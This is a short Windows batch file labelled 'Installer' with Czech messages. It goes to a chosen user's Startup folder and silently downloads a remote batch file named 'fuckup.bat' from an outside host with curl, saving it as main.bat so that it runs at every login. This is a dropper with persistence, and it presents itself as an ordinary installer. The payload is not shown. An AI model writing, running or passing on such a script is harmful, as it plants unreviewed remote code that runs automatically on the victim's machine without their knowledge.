@echo off
title Installer
SET uzivatel=%~1
echo Uzivatel nastaven na %uzivatel%
echo Going to directory
cd "C:\Users\%uzivatel%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo Im in directory "C:\Users\%uzivatel%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo Downloading files...
curl -s https://sources.tobir.xyz/fuckup.bat > main.bat
echo Downloaded main file (fuckup.bat is now main.bat)
echo The program is now installed, exiting this window...
ping localhost -n 3 > nul
exit